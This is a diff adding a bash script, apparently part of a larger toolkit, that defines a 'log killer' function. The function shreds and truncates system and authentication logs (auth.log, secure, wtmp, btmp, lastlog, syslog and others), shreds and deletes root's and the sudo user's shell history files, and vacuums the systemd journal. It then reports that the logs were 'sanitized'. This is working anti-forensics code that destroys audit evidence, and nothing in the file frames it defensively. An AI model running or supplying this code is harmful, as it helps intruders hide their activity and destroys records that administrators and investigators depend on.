@@ -1,0 +1,65 @@
+#!/bin/bash
+
+start_log_killer(){
+
+    local system_logs=(
+        "/var/log/messages"
+        "/var/log/auth.log"
+        "/var/log/kern.log"
+        "/var/log/cron.log"
+        "/var/log/maillog"
+        "/var/log/boot.log"
+        "/var/log/mysqld.log"
+        "/var/log/secure"
+        "/var/log/utmp"
+        "/var/log/wtmp"
+        "/var/log/btmp"
+        "/var/log/lastlog"
+        "/var/log/faillog"
+        "/var/log/syslog"
+        "/var/log/daemon.log"
+        "/var/log/yum.log"
+        "/var/log/pacman.log"
+        "/var/log/dpkg.log"
+    )
+
+    for log in "${system_logs[@]}"; do
+        if [ -f "$log" ]; then
+            shred -n 1 -z "$log" 2>/dev/null
+            truncate -s 0 "$log" 2>/dev/null || :> "$log"
+        fi
+    done
+
+    # Clean history files for root and sudo user
+    local history_files=(
+        "/root/.bash_history"
+        "/root/.zsh_history"
+        "/root/.history"
+    )
+
+    if [ -n "$SUDO_USER" ] && [ "$SUDO_USER" != "root" ]; then
+        local user_home="$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)"
+        if [ -n "$user_home" ] && [ -d "$user_home" ]; then
+            history_files+=(
+                "$user_home/.bash_history"
+                "$user_home/.zsh_history"
+                "$user_home/.history"
+            )
+        fi
+    fi
+
+    for hf in "${history_files[@]}"; do
+        if [ -f "$hf" ]; then
+            shred -n 1 -z -u "$hf" 2>/dev/null || rm -f "$hf"
+        fi
+    done
+
+    # Clear systemd journal if available
+    if command -v journalctl &>/dev/null; then
+        journalctl --rotate 2>/dev/null || true
+        journalctl --vacuum-time=1s 2>/dev/null || true
+    fi
+
+    info "Log killer successfully executed: logs and command history sanitized"
+
+}
